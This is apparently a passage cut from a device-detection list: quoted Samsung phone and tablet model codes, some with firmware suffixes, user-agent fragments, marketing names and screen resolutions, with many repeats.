'SAMSUNG GT-S7275R/S7275RXXUAMK2', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275R', 'SAMSUNG GT-S7275R-ORANGE', 'SAMSUNG GT-S7275R/S7275RXXUAPA2', 'GT-S7275B', 'GT-S7275B', 'GT-S7275B', 'GT-S7275T', 'GT-S7275Y', 'SM-G313HY', 'SM-G313MY', 'SM-G313MU', 'SM-G316MY', 'SM-G316M', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G316MY', 'SM-G316ML', 'SM-G316MY', 'SM-G313HZ', 'SM-G313HU', 'SM-G313U', 'SM-G318H', 'GT-S7500', 'GT-S7500', 'SAMSUNG GT-S7500/S7500BUMB1', 'GT-S7500', 'GT-S7500', 'GT-S7500T', 'GT-S7500', 'GT-S7500W', 'GT-S7500T', 'GT-S7500L', 'GT-S7500L', 'GT-S7500T', 'GT-S7500L', 'GT-S7500T', 'SM-G357FZ', 'SM-G310HN', 'SAMSUNG SM-G357FZ/G357FZXXU1AOE1', 'SM-G357FZ', 'SC-01H', 'SC-01H', 'SM-G850F', 'SM-G850F', 'SM-G850M', 'SAMSUNG-SM-J327AZ', 'SAMSUNG SM-J327AZ', 'SM-J337AZ', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'GT-I5801', 'SM-G386T', 'SM-G386T1', 'SM-G386T1', 'SAMSUNG SM-G386T', 'SM-G386T', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'GT-I8530', 'SM-G3858', 'SM-G3858', 'SAMSUNG-SM-G3858_TD/1.0 Android/4.2.2 Release/10.15.2013 Browser/AppleWebKit534.30', 'SM-G3858', 'SM-G3858', 'SM-G3858', 'SM-A226L', 'SAMSUNG SM-A226L', 'SM-M236L', 'SAMSUNG SM-M236L', 'SM-C5000', 'SAMSUNG SM-C5000', 'SAMSUNG SM-C500X', 'SM-C5010', 'SAMSUNG SM-C5010', 'SAMSUNG SM-C5018', 'SM-C7000', 'SAMSUNG SM-C7000', 'SM-C7000', 'SM-C7010', 'SM-C701F', 'SAMSUNG SM-C7010', 'SAMSUNG SM-C701F', 'SM-C7018', 'SAMSUNG SM-C7100', 'SM-C7108', 'SAMSUNG SM-C7108', 'SM-C9000', 'SM-C900F', 'SM-C900Y', 'EK-GC100', 'EK-GC100', 'EK-GC100', 'EK-GC120', 'EK-GC200', 'EK-GC200', 'EK-GC110', 'EK-GC110', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'SCH-S738C', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330B', 'GT-B5330B', 'GT-B5330', 'GT-B5330', 'GT-B5330', 'GT-B5330L', 'GT-I8262', 'GT-I8262', 'GT-I8262', 'GT-I8260', 'GT-I8262', 'GT-I8262B', 'GT-I8262D', 'GT-I8262D', 'GT-I8262B', 'SM-G355H', 'SM-G355M', 'SHW-M570S', 'SAMSUNG GT-I8580', 'SHW-M570S', 'SAMSUNG SHW-M570S', 'GT-I8580', 'GT-I8580', 'GT-I8580', 'SAMSUNG GT-I8580', 'SM-G3589W', 'SM-G3589W', 'SM-G3589W', 'SAMSUNG-SM-G3589W', 'SM-G386W', 'SM-G386F', 'SM-G3518', 'SM-G3586V', 'SM-G3586V', 'SM-G3518', 'SM-G3518', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G5108Q', 'SM-G3568V', 'SM-G3568V', 'SM-G350E', 'SM-G350', 'SM-G3509I', 'SM-G3508J', 'SM-G3502I', 'SM-G3502C', 'SM-G360BT', 'SM-S820L', 'SM-G360H', 'SM-G360F', 'SM-G360T', 'SM-G360M', 'SM-G361H', 'SM-G361F', 'SM-G361HU', 'SAMSUNG SM-G361H', 'SCH-R740C', 'SGH-S730M', 'SGH-S730G', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SCH-R740C', 'SM-E500H', 'SM-E500F', '720x1280', 'SM-E500M', 'SM-E5000', 'SM-E500YZ', 'SM-E700H', 'SM-E700F', 'SM-E7009', 'SM-E700M', 'GT-I8730', 'GT-I8730', 'GT-i8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'GT-I8730T', 'GT-I8730', 'GT-I8730', 'GT-I8730', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCOE1', 'SM-G3815', 'SAMSUNG SM-G3815/G3815XXUCNH1', 'SM-E025F', 'SM-F127G', 'SM-E135F', 'SM-E225F', 'SM-E236B', 'SAMSUNG SM-E236B', 'SM-F415F', 'SM-E426B', 'SAMSUNG SM-E426B', 'SM-E5260', 'SAMSUNG SM-E5260', 'SM-E625F', 'GT-S6810M', 'GT-S6810', 'GT-S6810P', 'GT-S6810B', 'GT-S6810L', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810L', 'GT-S6810E', 'GT-S6810M', 'GT-S6810E', 'GT-S6810M', 'GT-S6810P', 'GT-S6812C', 'GT-S6812', 'GT-S6812i', 'GT-S6812i', 'GT-S6812C', 'GT-S6812i', 'GT-S6812i', 'GT-S6812i', 'GT-S6812B', 'GT-S6812i', 'GT-S6812B', 'GT-S6812B', 'GT-S6790L', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790N', 'GT-S6790L', 'SC-04J', 'SC-02L', 'SM-F907B', 'SM-F900U', 'SM-F900F', 'SM-F907N', 'SM-F9000', 'SM-F900U1', 'SM-F900W', 'SM-G150NL', 'SM-G155S', 'SM-G150N0', 'SM-G150NS', 'SM-G1650', 'SM-W2015', 'SM-W2015', 'SAMSUNG-SM-W2015', 'GT-I9128I', 'GT-I9128I', 'GT-I9128E', 'SM-G7102', 'SM-G7102', 'SM-G7105', 'SM-G7106', 'SM-G7108', 'GT-I9082', 'GT-I9082', 'GT-I9082C', 'SM-G7202', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G7200', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G7200', 'SM-G720AX', 'SM-G720N0', 'SM-G7200', 'SM-G7200', 'SM-G720N0', 'SM-G720N0', 'SM-G7202', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9060', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9063T', 'GT-I9168I', 'GT-I9168I', 'SAMSUNG-GT-I9168_TD Release/1.15.2014 Browser/AppleWebKit/534.30', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'GT-I9168', 'GT-I9168I', 'SM-G531F', 'SM-G531H', 'SM-G530T', 'SM-G530H', 'SM-G530BT', 'SM-G530FZ', 'SM-G532F', 'SM-G531M', 'SM-G531BT', 'SAMSUNG-SM-J727AZ', 'SM-J100FN', 'SM-J100H', 'SM-J120H', 'SM-J120F', 'SM-J120FN', 'SM-J120H', 'SM-J111F', 'SM-J111M', 'SM-J110H', 'SM-J111M', 'SM-J110G', 'SM-J110F', 'SM-J105B', 'SM-J105H', 'SM-J105Y', 'SM-J106F', 'SM-J106H', 'SM-J106B', 'SM-J106M', 'SM-J200GU', 'SM-J200F', 'SM-J200M', 'SM-J200H', 'SM-J260F', 'SM-J260M', 'SM-J260G', 'SM-J260FU', 'SM-J260MU', 'SM-J260Y', 'SM-J200BT', 'SAMSUNG SM-J200BT', 'SM-G532G', 'SM-G532M', 'SM-G532MT', 'SM-J250G', 'SM-J250M', 'SM-J250F', 'SM-J250Y', 'SAMSUNG SM-J260AZ', 'SM-J3109', 'SM-J320Y', 'SM-J320H', 'SM-J320G', 'SM-J320FN', 'SM-J320V', 'SM-J320M', 'SAMSUNG-SM-J320A', 'SM-J330FN', 'SAMSUNG SM-J330F', 'SAMSUNG SM-J330FN/J330FNXXS4CUD3', 'SM-J330G', 'SM-J337P', 'SM-J337V', 'SAMSUNG SM-J337W', 'SM-J337U', 'SM-J337VPP', 'SM-J337R4', 'SM-J327V', 'SM-J327P', 'SM-J327R4', 'SM-S327VL', 'SM-S337TL', 'SAMSUNG SM-S327VL', 'SM-J327VPP', 'SM-S367VL', 'SAMSUNG SM-S367VL', 'SM-S357BL', 'SM-J327T1', 'SM-J3110', 'SM-J3119S', 'SAMSUNG-SM-J3119', 'SM-S320VL', 'SM-J337T', 'SM-J400F', 'SM-J400M', 'SM-J400G', 'SM-J400M', 'SM-J410F', 'SM-J410G', 'SM-J410F', 'SM-J410F', 'SM-J410F', 'SM-J415FN', 'SM-J415GN', 'Galaxy j5', 'SM-J500M', 'SM-J500G', 'SM-J500F', 'SM-J500H', 'SM-J500FN', 'SM-J510H', 'SM-J510FQ', 'SM-J510FN', 'SM-J510MN', 'SM-J510MN', 'SM-J510GN', 'SM-J530F', 'SAMSUNG SM-J530F/J530FXXS9CUE5', 'SM-G570M', 'SM-G570F', 'SM-G570Y', 'SM-J530Y', 'SAMSUNG SM-J530G', 'SM-J600FN', 'SM-J600GT', 'SM-J610FN', 'SM-J610F', 'SM-J610G', 'SM-J710F', 'SM-J700M', 'SM-J700H', 'SM-J710MN', 'SM-J710K', 'SM-J7108', 'SM-J700F', 'SM-J700P', 'SM-J710GN', 'SM-J700T', 'SM-J700T1', 'SAMSUNG SM-J727A', 'SM-J730K', 'SM-J727R4', 'SM-J727S', 'SM-J727U', 'SM-J737T1', 'SM-J737A', 'SM-J737V', 'SAMSUNG SM-J737U', 'SM-J737R4', 'SM-J737S', 'SM-J737P', 'SM-J701F', 'SM-J701MT', 'SM-S767VL', 'SM-S757BL', 'SAMSUNG SM-S767VL', 'SM-J720F', 'SM-J720M', 'SM-G615F', 'SAMSUNG SM-G615F', 'SM-G615FU', 'SM-G615F', 'SM-G610F', 'SM-G610M', 'SM-G610Y', 'SM-G611MT', 'SM-G611FF', 'SM-G611FF', 'SM-J730G', 'SM-J730F', 'SM-J730FM', 'SM-S727VL', 'SM-S737TL', 'SAMSUNG SM-S727VL', 'SAMSUNG SM-J727T1', 'U', 'SM-J727V', 'SM-J727P', 'SM-J727VPP', 'SM-C710F', 'SAMSUNG SM-C710F', 'SM-J810F', 'SM-J810Y', 'SM-J810M', 'SM-J810G', 'SM-J810M', 'SM-J8 Plus', 'SM-J8 Pro', 'SM-J8 Pro', 'SM-J8 Pro[9]', 'SM-J8 Pro [9]', 'SM-A605K', 'SAMSUNG SM-A605K/KKS3CVH2', 'SAMSUNG SM-A605K/KKU1ARG2', 'SAMSUNG SM-A605K/KKU3CTF2', 'SM-A202K', 'SAMSUNG SM-A202K/KKS8CWA1', 'SAMSUNG SM-M336K/KSU4CWD2', 'SAMSUNG SM-M336K/KSU4CWB3', 'SAMSUNG SM-M336K/KSU3BWA2', 'SM-A326K', 'SAMSUNG SM-A326K/KSS4DWC5', 'SAMSUNG SM-A326K/KSU3CVK5', 'SAMSUNG SM-A326K/KSU4DWB7', 'SAMSUNG SM-A326K/KSS3BVI2', 'SM-C115', 'SM-C115L', 'SM-C1158', 'SAMSUNG-SM-C1158_TD Android/4.4.2 Release/04.15.2014 Browser/AppleWebKit537.36', 'SM-C115W', 'SM-C115M', 'SM-S120VL', 'SAMSUNG SM-S120VL', 'SM-M015G', 'SM-M015F', 'SAMSUNG SM-M015G', 'SAMSUNG SM-M015F', 'SM-M013F', 'SAMSUNG SM-M013F', 'SM-M017F', 'SAMSUNG SM-M017F', 'SM-M022F', 'SM-M022G', 'SM-M025F', 'SM-M025F/DS', 'SM-E045F', 'SM-M045F', 'SM-M105M', 'SM-M105F', 'SM-M105G', 'SM-M107F', 'SAMSUNG SM-M107F', 'SM-M115F', 'SM-M127F', 'SM-M127G', 'SM-M135F', 'SAMSUNG SM-M135F', 'SM-M135FU', 'SM-M135M', 'SM-M136B', 'SAMSUNG SM-M136B', 'SM-M146B', 'SAMSUNG SM-M146B', 'SM-M205F', 'SM-M205M', 'SM-M205FN', 'SM-M205F', 'SM-M215F', 'SM-M215G', 'SAMSUNG SM-M215G', 'SM-M225FV', 'SAMSUNG SM-M225FV', 'SM-M236B', 'SAMSUNG SM-M236B', 'SM-M305F', 'SM-M305M', 'SM-M305M/DS', 'SM-M305F', 'SM-M307F', 'SM-M307FN', 'SM-M3070', 'SM-M307F', 'SM-M315F', 'SM-M315F/DS', 'SM-M317F', 'SAMSUNG SM-M317F', 'SM-M317F/DSN', 'SM-M325FV', 'SAMSUNG SM-M325FV', 'SM-M326B', 'SAMSUNG SM-M326B', 'SM-M336BU', 'SAMSUNG SM-M336B', 'SM-M405F', 'SAMSUNG SM-M405F', 'SM-M426B', 'SM-M515F', 'SM-M515F/DSN', 'SM-M526BR', 'SM-M536B', 'SAMSUNG SM-M536B', 'SM-M536B', 'SM-M625F', 'SM-M625F/DS', 'SAMSUNG SM-M625F', 'SGH-I527M', 'SM-G750H', 'SM-G7508Q', 'SM-G7509', 'SAMSUNG-SM-G750A', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'GT-N7000', 'SM-N970U', 'SM-N9700', 'SM-N970F', 'SM-N970U', 'SM-N971N', 'SM-N770F', 'SAMSUNG SM-N770F', 'SM-N975U', 'SM-N975F', 'SM-N975U1', 'SAMSUNG SM-N976B/N976BXXS8HWC5', 'SM-N976U', 'SM-N976N', 'SGH-I317M', 'Samsung Galaxy Note 2', 'SM-N980F', 'SAMSUNG SM-N980F', 'SAMSUNG SM-N981B', 'SM-N9810', 'SM-N981U', 'SM-N981N', 'SM-N985F', 'SAMSUNG SM-N985F', 'SM-N986U1', 'SM-N986B', 'SAMSUNG SM-N986B', 'SAMSUNG SM-N986U', 'SM-N986N', 'SM-N9008V', 'SM-N9006', 'SAMSUNG-SM-N900A', 'SM-N9005', 'SM-N900W8', 'Samsung GALAXY Note 3', 'SM-N900L', 'SM-N9009', 'SM-N900T', 'SM-N900P', 'SM-N9000Q', 'SAMSUNG SM-N9002', 'SM-N9002', 'SAMSUNG SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-N9002', 'SM-9005', 'SM-9005', 'SM-N750L', 'SM-N7505', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SAMSUNG SM-N7502', 'SM-N7502', 'SM-N7502', 'SM-N9100', 'SM-N910C', '1440x2560', 'SM-N910V', 'SM-N910H', 'SM-N910U', 'SM-N9108V', 'SM-N915FY', 'SM-N915T', 'SM-N9150', 'SM-N915G', 'SM-N915A', 'SM-N915S', 'SM-N915D', 'SM-N915W8', 'SM-N916L', 'SM-N916S', 'SM-N916K', 'SM-N916LSK', 'SM-N920C', 'SM-N920L', 'SAMSUNG SM-N920C', 'SAMSUNG-SM-N920A', 'SM-N920K', 'SM-N920S', 'SM-N920G', 'SM-N920V', 'SM-N920I', 'SM-N9208', 'SM-N930F', 'SM-N9300', 'SM-N930x', 'SM-N930P', 'SM-N930X', 'SM-N930W8', 'SM-N930V', 'SM-N930T', 'SM-N9500', 'SM-N950U', 'SM-N950F', 'SM-N950N', 'SAMSUNG SM-N950F', 'SM-N960U', 'SM-N960F', 'SM-N960U', 'SM-N960U1', 'SM-N960W', 'SC-01G', 'SCL24', 'SAMSUNG SCL24', 'SM-N935S', 'SM-N935F', 'SM-N935K', 'SM-N935L', 'N7100', 'GT-N7100', 'SAMSUNG GT-N7100', 'GT-N7100', 'GT-N7105', 'GT-N7105T', 'SAMSUNG GT-N7105/N7105XXDMC3', 'GT-N7105T', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'GT-N7105', 'Galaxy Note N8000', 'Galaxy Note20', 'SAMSUNG EK-GN120', 'SM-G550T', 'SM-G5500', 'SM-G550FY', 'SM-G5510', 'SM-G550T1', 'SM-S550TL', 'SM-G5528', 'SM-G5528', 'SM-G600FY', 'SM-G600F', 'SM-G6000', 'SM-G6100', 'SM-G610S', 'SM-G611F', 'SM-G611L', 'SM-G611S', 'SAMSUNG SM-J710FN', 'P1 Galaxy Plus', 'SM-G110M', 'SM-G110H', 'SM-G110B', 'SM-G110H', 'SM-G110H', 'GT-S5310', 'GT-S5310I', 'GT-S5310C', 'GT-S5310B', 'GT-S5310T', 'GT-S5310G', 'GT-S5310E', 'GT-S5310E', 'GT-S5310L', 'GT-S5310G', 'GT-S5310', 'GT-S5310G', 'GT-S5301B', 'GT-S5301B', 'Gt-s5301b', 'GT-S5301B', 'GT-S5301', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'GT-S5301B', 'GT-S5301', 'SAMSUNG GT-S5301/S5301XXAMA3', 'GT-S5301B', 'GT-S5301L', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510L', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510', 'GT-B7510B', 'GT-B7510', 'GT-B7510', 'SM-A826S', 'SAMSUNG SM-A826S', 'SAMSUNG SM-M536S', 'SM-G910S', 'SM-G910S', 'SM-G910S', 'SAMSUNG SM-G910S', 'GT-I9000', 'GT-I9000', 'GT-I9088', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9000', 'GT-I9008', 'GT-i9008', 'GT-I9000', 'GT-I9000', 'GT-I9000B', 'GT-I9000M', 'GT-I9000', 'GT-I9070', 'GT-I9070', 'GT-I9070', 'GT-I9070P', 'GT-I9070P', 'SAMSUNG GT-I9070/I9070BULK1', 'GT-I9070', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562C', 'GT-S7562L', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'GT-S7582', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'SM-G316HU', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9010', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'GT-I9100', 'SPH-D710', 'SHV-E120S', 'SHV-E120L', 'SHV-E120K/KKJMD2', 'SHV-E120L', 'SHV-E120LSK', 'SHV-E120LSK', 'SHV-E120LKS', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S', 'SHV-E120S/KKJMD2', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'GT-I9105P', 'GT-I9105', 'GT-I9105', 'ISW11SC', 'SCH-I535', 'GT-I9300', 'GT-I9300', 'GT-I9305', 'SCH-R530X', 'SCH-R530X', 'SCH-R530U', 'GT-I9305T', 'SCH-R530C', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190', 'GT-I8190N', 'GT-I8190', 'GT-I8190T', 'GT-I8190N', 'GT-I8200N', 'GT-I8200', 'GT-I8200', 'GT-I8200N', 'GT-I8200', 'GT-I8200L', 'GT-I8200', 'GT-I8200Q', 'GT-I8200Q', 'GT-I9301I', '720x1280', 'Samsung Galaxy S IV(I950X)', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SAMSUNG GT-I9001/I9001BOKQ4', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'GT-I9001', 'SM-G973F', 'SAMSUNG SM-G973F', 'SAMSUNG SM-G973U', 'SM-G977N', 'SM-G973U1', 'SAMSUNG SM-G973F/G973FXXSGHWC2', 'SAMSUNG SM-G977N', 'SAMSUNG SM-G770F', 'SM-G770F/DS', 'SM-G975F', 'SAMSUNG SM-G975F', 'SM-G975U', 'SM-G975U1', 'SAMSUNG SM-G975U', 'SAMSUNG SM-G975F/G975FXXSGHWC2', 'SC-05L', 'SM-G970F', 'SAMSUNG SM-G970F/G970FXXSGHWA3', 'SM-G970U', 'SM-G970U1', 'SAMSUNG SM-G980F', 'SM-G980F/DS', 'SM-G981U', 'SM-G981U', 'SM-G981B', 'SCG01', 'SM-G981U1', 'SM-G981W', 'SM-G981V', 'SM-G981N', 'SC-51A', 'SM-G9810', 'SC51Aa', 'SM-G780G', 'SAMSUNG SM-G780F', 'SAMSUNG SM-G780G', 'SM-G781B', 'SM-G781V', 'SM-G781U', 'SM-G781U1', 'Galaxy S20 Ultra', 'SM-G988B', 'SM-G988W', 'SM-G988U', 'SAMSUNG SM-G988B', 'SM-G988U1', 'SM-G988N', 'SAMSUNG SM-G985F/G985FXXSFFVIB', 'SM-G985F/DS', 'SM-G986B', 'SM-G986U', 'SAMSUNG SM-G986B', 'SM-G986N', 'SM-G986W', 'SM-G986U1', 'Galaxy S21', 'SM-G991W', 'SM-G991U1', 'SM-G991B', 'SM-G991B', 'SM-G991B', 'SC-51B', 'SM-G991V', 'SM-G990U2', 'SM-G990B2', 'SAMSUNG SM-G990B', 'SM-G990E', 'SAMSUNG SM-G990B/G990BXXU4EWC7', 'SM-G998U', 'SAMSUNG SM-G998B', 'SM-G998N', 'SM-G998U1', 'SAMSUNG SM-G998U', 'SM-G998W', 'Galaxy S21+', 'SM-G996U', 'SM-G996B', 'SM-G996N', 'SM-G996B', 'SM-G9960', 'SM-S901U', 'SAMSUNG SM-S901U', 'SM-S901U1', 'SM-S901B', 'SAMSUNG SM-S901B', 'SM-S901W', 'SAMSUNG SM-S908E', 'SM-S908B', 'SAMSUNG SM-S908U', 'SM-S908U1', 'SM-S9080', 'SM-S908U1', 'SAMSUNG SM-S908B', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906N', 'SM-S906E', 'SM-S906U', 'SAMSUNG SM-S906B', 'SM-S906U1', 'SM-S906W', 'SM-S911W', 'SM-S911B', 'SM-S911U', 'SM-S911U1', 'SM-S918W', 'SAMSUNG SM-S918B/S918BXXS1AWD1', 'SM-S918U', 'SM-S918U1', 'SM-S916U', 'SM-S916B', 'SM-S916U1', 'SM-S916W', 'Galaxy S3', 'Samsung Galaxy S3', 'Galaxy S3', 'SM-G730V', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SAMSUNG-SM-G730A', 'SM-G730W8', 'SM-G730W8', 'GT-I9505', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SCH-I959', 'SAMSUNG GT-I9505-ORANGE', 'SCH-I545', 'GT-I9500', 'SAMSUNG GT-I9505/I9505XXUBMEA', 'SAMSUNG GT-I9505', 'SAMSUNG GT-I9505/I9505XXUAMDC', 'SAMSUNG GT-I9505/I9505XXUDMGG', 'GT-I9295', 'SHV-E330S', 'SHV-E330L', 'SAMSUNG SHV-E330L', 'SHV-E330S', 'SHV-E330K', 'SAMSUNG SHV-E330S', 'SHV-E330K', 'GT-I9195', 'lineage_serranoltexx', 'GT-I9195I', 'GT-I9192I', 'GT-I9190', 'GT-I9192', 'SCH-I435', 'GT-I9515', 'GT-I9506', 'SAMSUNG GT-I9506', 'SAMSUNG SM-C105L', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C101', 'SAMSUNG SM-C105', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105K', 'SM-C105S', 'SM-C105L', 'SM-C105S', 'SM-C105L', 'SM-G900T', 'SM-G900F', 'SM-G900V', 'SM-G900M', 'SM-G900F', 'SM-G900P', 'SM-G900H', 'SM-G9006V', 'SM-G900F', 'SM-G870W', 'SAMSUNG-SM-G890A', 'SAMSUNG-SM-G870A', '1080x1920', 'SAMSUNG SM-G890A', 'SM-G900FD', 'SM-G860P', 'SM-G901F', 'SAMSUNG SM-G901F/G901FXXU1CPHA', 'SM-G800F', 'SM-G800H', 'SM-G903F', 'SM-G903W', 'SM-G920I', 'SM-G920P', 'SM-G920F', 'SM-G920W8', 'SAMSUNG SM-G920F', 'SM-G920K', 'SAMSUNG-SM-G920A', 'SM-G925F', 'SM-G925K', 'SAMSUNG-SM-G925A', 'SM-G9250', 'SAMSUNG SM-G925F', 'SAMSUNG SM-G928F', 'SAMSUNG-SM-G928A', 'SM-G928C', 'SM-G9280', 'SM-G9287', 'SAMSUNG SM-G928T', 'SM-G928I', 'SM-G930F', 'SM-G930W8', 'SAMSUNG SM-G930F', 'SM-G930V', 'SM-G930U', 'SM-G930S', 'SM-G930L', 'SM-G9300', 'SAMSUNG-SM-G891A', 'SAMSUNG SM-G891A', 'SM-G935F', 'SM-G935U', 'SAMSUNG SM-G935A', 'SM-G935T', 'SM-G935VC', 'SM-G935S', 'SM-G935L', 'SAMSUNG SM-G935W8', 'SM-G9350', 'SAMSUNG SM-G950U', 'SAMSUNG SM-G950F', 'SM-G950U1', 'SM-G950N', 'SC-02J', 'SAMSUNG SM-G950W', 'SM-G892A', 'SAMSUNG SM-G892A', 'SAMSUNG SM-G892U', 'SM-G8750', 'SM-G8750', 'SM-G8750', 'SAMSUNG SM-G8750', 'SM-G955U', 'SM-G955F', 'SAMSUNG SM-G955F/G955FXXUCDVG4', 'SM-G955W', 'SM-G9550', 'SM-G960F', 'SM-G960U', 'SAMSUNG SM-G960U1', 'SAMSUNG SM-G960F', 'SM-G965U', 'SM-G965F', 'SM-G965F', 'SM-G965U1', 'SM-G9650', 'SAMSUNG-SM-J321AZ', 'SAMSUNG-SM-J321AZ', 'SAMSUNG SM-J321AZ', 'SAMSUNG-SM-J326AZ', 'SM-J336AZ', 'SAMSUNG SM-J336AZ', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700', 'GT-I5700', 'GT-I5700L', 'GT-I5700R', 'GT-I5700', 'GT-I5700', 'GT-I5700', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'GT-S5280', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I200PP', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'SCH-I829', 'GT-P1000', 'GALAXY TAB', 'Galaxy Tab', 'GT-P1000', 'Galaxy Tab 2', 'Galaxy Tab 2 3G', 'GT-P3100', 'Flow', 'GT-P3113', 'GT-P3113', 'GT-P3110', 'GT-P3110', 'SM-T116', 'SM-T116NU', 'SM-T116NY', 'SM-T116NQ', 'Galaxy Tab 4', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6200', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'GT-P6201', 'Galaxy Tab KT107', 'Galaxy Tab Pro', 'Galaxy Tab PRO 10', 'SAMSUNG-SM-T2519', 'Samsung galaxy tab s3', 'Galaxy Tab2 3G', 'Galaxy Tab3 P5200', 'Galaxy Tab3 T311', 'Galaxy Tab4', 'GT-S7560', 'SAMSUNG GT-S7560/S7560XXBNC2', 'GT-S7560M', 'SAMSUNG GT-S7560/S7560XXBNJ1', 'SAMSUNG GT-S7560/S7560XXAME9', 'SAMSUNG GT-S7560/S7560XXAMH3', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'GT-S7560M', 'SCH-I699I', 'SAMSUNG-SCH-I699I', 'GT-S7560M', 'GT-S7560', 'GT-S7560', 'GT-S7560', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', 'SCH-I739', '800x1212', 'GT-S7390', 'GT-S7390', 'GT-S7390G', 'GT-S7390', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SAMSUNG GT-S7580/S7580XXUBOA1', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580', 'GT-S7580L', 'SM-G318MZ', 'SM-G318HZ', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'GT-I8150', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'SM-T255S', 'GT-I8150', 'SAMSUNG-SM-W2016', 'SM-W2016', 'SM-W2018', 'SM-W2018', 'SAMSUNG SM-W2019', 'SM-W2019', 'SAMSUNG SM-W2021', 'SM-W2021', 'SM-W2021', 'SAMSUNG SM-W2022', 'SAMSUNG SM-W9023', 'SM-G600S', 'SAMSUNG SM-G600S', 'SAMSUNG SM-E426S', 'GT-I8552', 'GT-I8552', 'GT-I8552B', 'GT-I8552', 'GT-I8552', 'SM-G3812', 'SM-G3812', 'SM-G3812B', 'SM-G3812B', 'SM-G3812', 'SM-G3812', 'Samsung SM-G3818', 'SM-G3818', 'SM-G3812', 'Galaxy Wonder', 'SX Galaxy Xcove 4S', 'GT-S7710L', 'GT-S7710', 'GT-S7710', 